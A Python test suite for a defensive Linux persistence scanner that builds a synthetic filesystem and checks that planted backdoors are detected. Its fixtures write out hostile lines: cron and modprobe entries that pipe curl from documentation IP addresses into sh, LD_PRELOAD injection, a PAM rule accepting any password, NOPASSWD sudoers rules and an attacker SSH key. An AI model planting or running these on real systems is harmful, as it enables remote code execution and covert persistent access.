"""Vigil Persist: baseline and diff of every autostart location, package ownership and
integrity. Every file is SYNTHETIC: a fake root and a fake home built in a temporary
folder, with fake pacman and dpkg databases and a fake /proc/modules. Nothing on the
real system is read for these tests, and nothing is ever run or changed."""

import builtins
import gzip
import hashlib
import json
import os
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from vigil.core import finding
from vigil.core.pkgdb import PackageFiles
from vigil.persist import locations, scan
from vigil.persist.server import App

FIX = Path(__file__).parent.parent / "fixtures"


def osr(name):
    out = {}
    for line in (FIX / "os-release" / name).read_text().splitlines():
        k, _, v = line.partition("=")
        if v:
            out[k] = v.strip('"')
    return out


UNIT = "[Unit]\nDescription=Example timer\n\n[Service]\nExecStart=/usr/bin/example-clean --quiet\n"


class Fake:
    """A SYNTHETIC system: root/ (etc, usr, var/lib/<pkgdb>) and home/."""

    def __init__(self, tmp, pkgdb="pacman"):
        self.root = Path(tmp, "root")
        self.home = Path(tmp, "home", "alice")
        self.proc = Path(tmp, "proc")
        for d in ("etc/systemd/system/multi-user.target.wants", "usr/lib/systemd/system", "etc/cron.d",
                  "etc/xdg/autostart", "etc/pam.d", "etc/sudoers.d", "etc/modprobe.d", "etc/udev/rules.d",
                  "etc/profile.d"):
            (self.root / d).mkdir(parents=True, exist_ok=True)
        for d in (".config/systemd/user", ".config/autostart", ".ssh"):
            (self.home / d).mkdir(parents=True, exist_ok=True)
        self.proc.mkdir()
        self.w("usr/lib/systemd/system/example-clean.service", UNIT)
        os.symlink("/usr/lib/systemd/system/example-clean.service",
                   self.root / "etc/systemd/system/multi-user.target.wants/example-clean.service")
        self.w("etc/crontab", "SHELL=/bin/sh\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n")
        self.w("etc/pam.d/system-login", "auth required pam_unix.so\naccount required pam_unix.so\n")
        self.w("etc/sudoers", "root ALL=(ALL:ALL) ALL\n%wheel ALL=(ALL:ALL) ALL\n", mode=0o440)
        self.w("etc/profile", "export PATH=/usr/bin\n")
        self.w("etc/udev/rules.d/70-example.rules", 'ACTION=="add", SUBSYSTEM=="usb", MODE="0660"\n')
        self.h(".bashrc", "alias ll='ls -l'\n")
        self.h(".ssh/authorized_keys", "ssh-ed25519 AAAAC3NzaSYNTHETICKEYxxxxxxxxxxxxxxxxxxxxxxxx alice@laptop\n")
        self.h(".config/autostart/syncthing.desktop", "[Desktop Entry]\nType=Application\nName=Syncthing\n"
               "Exec=/usr/bin/syncthing serve --no-browser\n")
        (self.proc / "modules").write_text("ext4 1000000 2 - Live 0x0\nvfat 20000 1 - Live 0x0\n")
        if pkgdb == "pacman":
            self.pacman_pkg("example", "1.0-1", ["usr/lib/systemd/system/example-clean.service"])
            self.pacman_pkg("pambase", "20230918-1", ["etc/pam.d/system-login"], backup=["etc/pam.d/system-login"])
        elif pkgdb == "dpkg":
            info = self.root / "var/lib/dpkg/info"
            info.mkdir(parents=True)
            (info / "example.list").write_text("/.\n/usr\n/usr/lib/systemd/system/example-clean.service\n")
            md5 = hashlib.md5(UNIT.encode()).hexdigest()
            (info / "example.md5sums").write_text(f"{md5}  usr/lib/systemd/system/example-clean.service\n")
            (info / "libpam-runtime.list").write_text("/etc/pam.d/system-login\n")
            conf_md5 = hashlib.md5(b"something else\n").hexdigest()
            (self.root / "var/lib/dpkg/status").write_text(
                f"Package: libpam-runtime\nStatus: install ok installed\nConffiles:\n /etc/pam.d/system-login {conf_md5}\n\n")
        elif pkgdb == "rpm":
            (self.root / "var/lib/rpm").mkdir(parents=True)

    def w(self, rel, text, mode=None):
        p = self.root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text)
        os.chmod(p, mode if mode is not None else 0o644)
        return p

    def h(self, rel, text):
        p = self.home / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text)
        return p

    def pacman_pkg(self, name, ver, paths, backup=()):
        d = self.root / f"var/lib/pacman/local/{name}-{ver}"
        d.mkdir(parents=True)
        (d / "desc").write_text(f"%NAME%\n{name}\n\n%VERSION%\n{ver}\n\n"
                                + ("%BACKUP%\n" + "\n".join(f"{b}\tx" for b in backup) + "\n\n" if backup else ""))
        (d / "files").write_text("%FILES%\n" + "\n".join(paths) + "\n")
        lines = ["#mtree", "/set type=file uid=0 gid=0 mode=644"]
        for rel in paths:
            data = (self.root / rel).read_bytes()
            lines.append(f"./{rel} size={len(data)} sha256digest={hashlib.sha256(data).hexdigest()}")
        with gzip.open(d / "mtree", "wt") as fh:
            fh.write("\n".join(lines) + "\n")

    def scan(self, name="arch", baseline=None):
        return scan.scan(str(self.home), str(self.root), str(self.proc), osr=osr(name), baseline=baseline, now=1000.0)


def bad(rep, sev=("High", "Medium")):
    return [f for f in rep["findings"] if f["severity"] in sev]


class CleanSystemTests(unittest.TestCase):
    def test_a_clean_system_raises_nothing(self):
        with tempfile.TemporaryDirectory() as tmp:
            rep = Fake(tmp).scan()
            self.assertEqual(bad(rep), [], [f["title"] for f in bad(rep)])
            groups = {e["group"] for e in rep["entries"]}
            for g in ("systemd", "cron", "autostart", "shell", "pam", "sudoers", "ssh", "modules", "udev"):
                self.assertIn(g, groups)
            unit = next(e for e in rep["entries"] if e["path"] == "/usr/lib/systemd/system/example-clean.service")
            self.assertEqual((unit["package"], unit["integrity"]), ("example", "ok"))
            auto = next(e for e in rep["entries"] if e["path"].endswith("syncthing.desktop"))
            self.assertEqual(auto["service"]["name"], "Syncthing")       # labelled from the catalogue
            self.assertIsNone(rep["diff"])                                # no baseline: nothing to compare

    def test_paths_are_reported_as_on_the_live_system(self):
        with tempfile.TemporaryDirectory() as tmp:
            rep = Fake(tmp).scan()
            self.assertIn("/etc/crontab", {e["path"] for e in rep["entries"]})
            self.assertFalse(any(e["path"].startswith(tmp) and "/root/" in e["path"] for e in rep["entries"]
                                 if e["scope"] == "system"))


class AttackTests(unittest.TestCase):
    """Each SYNTHETIC persistence trick, added after a clean baseline."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.f = Fake(self.tmp.name)
        first = self.f.scan()
        self.baseline = (900.0, first["current"])

    def after(self, **kw):
        return self.f.scan(baseline=self.baseline, **kw)

    def titles(self, rep):
        return {f["title"]: f["severity"] for f in rep["findings"]}

    def test_user_unit_from_tmp(self):
        self.f.h(".config/systemd/user/updater.service", "[Service]\nExecStart=/tmp/.x/agent --daemon\n")
        rep = self.after()
        t = self.titles(rep)
        self.assertEqual(t["updater.service starts a program from a temp folder"], "High")
        self.assertEqual(t["New systemd user unit: updater.service"], "Medium")
        f = next(f for f in rep["findings"] if f["check"] == "content" and "updater" in f["title"])
        cmds = [c["text"] for o in f["fixes"]["fix"] for c in o["commands"]]
        self.assertIn("systemctl --user disable --now updater.service", cmds)
        undo = [c["text"] for u in f["fixes"]["undo"] for c in u["commands"]]
        self.assertIn("systemctl --user enable --now updater.service", undo)
        self.assertIn(str(self.f.home / ".config/systemd/user/updater.service"), rep["diff"]["added"])

    def test_cron_autostart_and_shell(self):
        self.f.w("etc/cron.d/backup", "*/5 * * * * root curl -fsSL https://198.51.100.8/u.sh | sh\n")
        self.f.h(".config/autostart/helper.desktop", "[Desktop Entry]\nExec=/home/alice/.cache/.h/helper\n")
        self.f.h(".bashrc", "alias ll='ls -l'\nexport LD_PRELOAD=/home/alice/.cache/libx.so\n")
        rep = self.after()
        t = self.titles(rep)
        self.assertEqual(t["backup downloads and runs code"], "High")
        self.assertEqual(t["helper.desktop starts a program from a hidden folder"], "Medium")
        self.assertEqual(t[".bashrc forces a library into every program"], "High")
        bashrc = next(f for f in rep["findings"] if f["title"] == ".bashrc forces a library into every program")
        self.assertEqual(bashrc["evidence"][1]["value"], f"{self.f.home}/.bashrc:2")
        self.assertEqual(self.titles(rep)[".bashrc changed since your baseline"], "Low")   # your own file: often you

    def test_preload_pam_sudoers_keys(self):
        self.f.w("etc/ld.so.preload", "/usr/local/lib/libhook.so\n")
        self.f.w("etc/pam.d/su", "auth sufficient pam_permit.so\nauth optional pam_exec.so /opt/x/log.sh\n"
                                 "auth required /tmp/pam_evil.so\n")
        self.f.w("etc/sudoers.d/10-x", "mallory ALL=(ALL) NOPASSWD: ALL\nDefaults !authenticate\n", mode=0o440)
        self.f.h(".ssh/authorized_keys", "ssh-ed25519 AAAAC3NzaSYNTHETICKEYxxxxxxxxxxxxxxxxxxxxxxxx alice@laptop\n"
                                         "ssh-ed25519 AAAAC3NzaSYNTHETICKEYyyyyyyyyyyyyyyyyyyyyyyyy mallory@evil\n")
        t = self.titles(self.after())
        self.assertEqual(t["/etc/ld.so.preload loads libraries into every program"], "High")
        self.assertEqual(t["Login accepts any password"], "High")
        self.assertEqual(t["Logging in runs an extra program"], "Medium")
        self.assertEqual(t["Login loads a module from an unusual place"], "High")
        self.assertEqual(t["A sudo rule skips the password for everything"], "Medium")
        self.assertEqual(t["A sudo rule switches off a safety check"], "High")
        self.assertEqual(t["authorized_keys changed since your baseline"], "High")

    def test_modules_udev_permissions(self):
        self.f.w("etc/modprobe.d/evil.conf", "install usb_storage /bin/sh -c 'curl -s https://203.0.113.4/k | sh'\n"
                                             "install floppy /bin/false\n")
        self.f.w("etc/udev/rules.d/99-x.rules", 'ACTION=="add", RUN+="/bin/sh -c \'/tmp/x\'"\n')
        self.f.w("etc/profile.d/open.sh", "export X=1\n", mode=0o666)
        p = self.f.w("etc/cron.d/user-owned", "# nothing\n")
        os.chown(p, 1000, 1000)
        (self.f.proc / "modules").write_text("ext4 1000000 2 - Live 0x0\nvfat 20000 1 - Live 0x0\n"
                                             "rootkit 16384 0 - Live 0x0 (OE)\n")
        rep = self.after()
        t = self.titles(rep)
        self.assertEqual(t["Loading a kernel module runs a command"], "High")
        self.assertEqual(sum(1 for f in rep["findings"] if f["title"] == "Loading a kernel module runs a command"), 1)
        self.assertEqual(t["Plugging in a device runs a shell command"], "High")
        self.assertEqual(t["Anyone on this PC can change open.sh"], "High")
        self.assertEqual(t["user-owned is owned by a normal user"], "Medium")
        self.assertIn("Kernel module rootkit is unsigned or out of tree", t)
        mod = next(f for f in rep["findings"] if f["check"] == "new_since_baseline" and "rootkit" in f["title"])
        cmds = [c["text"] for o in mod["fixes"]["check"] for c in o["commands"]]
        self.assertIn("modinfo rootkit", cmds)

    def test_removed_and_changed(self):
        os.remove(self.f.root / "etc/udev/rules.d/70-example.rules")
        self.f.w("etc/crontab", "SHELL=/bin/sh\n")
        rep = self.after()
        self.assertEqual([x["path"] for x in rep["diff"]["removed"]], ["/etc/udev/rules.d/70-example.rules"])
        self.assertEqual(rep["diff"]["changed"], ["/etc/crontab"])
        self.assertEqual(self.titles(rep)["crontab changed since your baseline"], "Medium")


class PackageIntegrityTests(unittest.TestCase):
    def test_pacman_changed_unit_and_backup_file(self):
        with tempfile.TemporaryDirectory() as tmp:
            f = Fake(tmp)
            f.w("usr/lib/systemd/system/example-clean.service", UNIT.replace("--quiet", "--quiet; curl x | sh"))
            f.w("etc/pam.d/system-login", "auth required pam_unix.so\n# edited\n")
            rep = f.scan()
            ch = {x["evidence"][0]["value"]: x for x in rep["findings"] if x["check"] == "package_changed"}
            unit = ch["/usr/lib/systemd/system/example-clean.service"]
            self.assertEqual(unit["severity"], "High")
            cmds = [c["text"] for o in unit["fixes"]["check"] for c in o["commands"]]
            self.assertIn("pacman -Qkk example", cmds)
            self.assertIn("sudo pacman -S example", [c["text"] for o in unit["fixes"]["fix"] for c in o["commands"]])
            self.assertEqual(ch["/etc/pam.d/system-login"]["severity"], "Low")    # a backup (config) file

    def test_unchanged_package_file_is_labelled_not_alarmed(self):
        with tempfile.TemporaryDirectory() as tmp:
            f = Fake(tmp)
            text = "ACTION==\"add\", RUN+=\"/bin/sh -c 'echo add > /tmp/log'\"\n"
            f.w("usr/lib/udev/rules.d/60-vendor.rules", text)
            f.pacman_pkg("vendor-rules", "1-1", ["usr/lib/udev/rules.d/60-vendor.rules"])
            rep = f.scan()
            hit = next(x for x in rep["findings"] if x["title"] == "Plugging in a device runs a shell command")
            self.assertEqual(hit["severity"], "Low")
            self.assertIn("vendor-rules", hit["likely"])

    def test_dpkg_md5sums_and_conffiles(self):
        with tempfile.TemporaryDirectory() as tmp:
            f = Fake(tmp, pkgdb="dpkg")
            pf = PackageFiles(str(f.root))
            self.assertEqual(pf.kind, "dpkg")
            self.assertEqual(pf.owner("/usr/lib/systemd/system/example-clean.service"), "example")
            self.assertEqual(pf.verify("/usr/lib/systemd/system/example-clean.service"), "ok")
            self.assertTrue(pf.expected("/etc/pam.d/system-login")["conffile"])
            rep = f.scan("ubuntu")
            pam = next(x for x in rep["findings"] if x["check"] == "package_changed")
            self.assertEqual(pam["severity"], "Low")
            self.assertIn("dpkg --verify libpam-runtime", [c["text"] for o in pam["fixes"]["check"] for c in o["commands"]])

    def test_rpm_distros_say_what_they_cannot_check(self):
        for name, verify, reinstall in (("fedora", "rpm -V", "sudo dnf reinstall"), ("opensuse", "rpm -V", "sudo zypper install -f")):
            with tempfile.TemporaryDirectory() as tmp:
                f = Fake(tmp, pkgdb="rpm")
                rep = f.scan(name)
                self.assertEqual(rep["package_db"], "rpm")
                self.assertTrue(any("RPM" in x for x in rep["limits"]))
                f.w("etc/cron.d/x", "* * * * * root /tmp/x\n")
                hit = next(x for x in f.scan(name)["findings"] if "temp folder" in x["title"])
                owner = [c["text"] for o in hit["fixes"]["check"] for c in o["commands"]]
                self.assertIn("rpm -qf /etc/cron.d/x", owner)


class FormatAndSafetyTests(unittest.TestCase):
    def test_every_finding_follows_the_suite_format(self):
        with tempfile.TemporaryDirectory() as tmp:
            f = Fake(tmp)
            base = (1.0, f.scan()["current"])
            f.h(".config/systemd/user/x.service", "[Service]\nExecStart=/dev/shm/x\n")
            f.w("etc/ld.so.preload", "/x.so\n")
            f.w("etc/sudoers.d/y", "Defaults !authenticate\n")
            for x in f.scan(baseline=base)["findings"]:
                with self.subTest(x["title"]):
                    self.assertEqual(finding.problems(x), [])
                    self.assertFalse(x["title"].endswith("…"), x["title"])

    def test_scanning_writes_nothing_and_runs_nothing(self):
        with tempfile.TemporaryDirectory() as tmp:
            f = Fake(tmp)
            before = {p: p.read_bytes() for p in Path(tmp).rglob("*") if p.is_file() and not p.is_symlink()}
            real_open = builtins.open

            def guarded(file, mode="r", *a, **k):
                if any(c in mode for c in "wax+"):
                    raise AssertionError(f"wrote {file}")
                return real_open(file, mode, *a, **k)
            boom = AssertionError("ran something")
            with mock.patch("builtins.open", guarded), mock.patch.object(subprocess, "run", side_effect=boom), \
                    mock.patch.object(subprocess, "Popen", side_effect=boom), mock.patch.object(os, "system", side_effect=boom):
                f.scan()
            after = {p: p.read_bytes() for p in Path(tmp).rglob("*") if p.is_file() and not p.is_symlink()}
            self.assertEqual(before, after)

    def test_unreadable_files_are_listed_as_hidden(self):
        if os.geteuid() == 0:
            real = locations.read_entry

            def as_user(p, *a):
                e = real(p, *a)
                if e and p.endswith("sudoers"):
                    e.update(readable=False, text="", sha256=None)
                return e
            ctx = mock.patch.object(locations, "read_entry", as_user)
        else:  # pragma: no cover - when tests run as a normal user the permission bites for real
            ctx = mock.patch.object(locations, "READ_MAX", locations.READ_MAX)
        with tempfile.TemporaryDirectory() as tmp, ctx:
            f = Fake(tmp)
            os.chmod(f.root / "etc/sudoers", 0o400)
            rep = f.scan()
            self.assertIn("/etc/sudoers", [h["path"] for h in rep["hidden"]])
            self.assertTrue(any("only be read by root" in x for x in rep["limits"]))


class ServerTests(unittest.TestCase):
    def test_first_scan_is_the_baseline_then_diff_then_accept(self):
        with tempfile.TemporaryDirectory() as tmp:
            f = Fake(tmp)
            app = App(Path(tmp, "data"), home=str(f.home), root=str(f.root), proc=str(f.proc),
                      os_release_path=str(FIX / "os-release/arch"))
            self.addCleanup(app.close)
            post = lambda r: app.routes()[("POST", r)]({}, b"{}", {})
            first = post("/api/scan")
            self.assertTrue(first["baseline_created"])
            self.assertNotIn("current", first)
            f.h(".config/autostart/new.desktop", "[Desktop Entry]\nExec=/tmp/new\n")
            second = post("/api/scan")
            self.assertEqual(len(second["diff"]["added"]), 1)
            post("/api/accept")
            third = post("/api/scan")
            self.assertEqual(third["diff"]["added"], [])
            exported = [json.loads(x) for x in Path(tmp, "data/findings.jsonl").read_text().splitlines()]
            self.assertTrue(all(x["tool"] == "persist" for x in exported))
            from vigil.persist.server import make_server
            from ..helpers import page_check
            page_check(self, make_server, app, [("/", b"<title>Vigil Persist</title>"), ("/static/persist.js", b"findingList")])


if __name__ == "__main__":
    unittest.main()
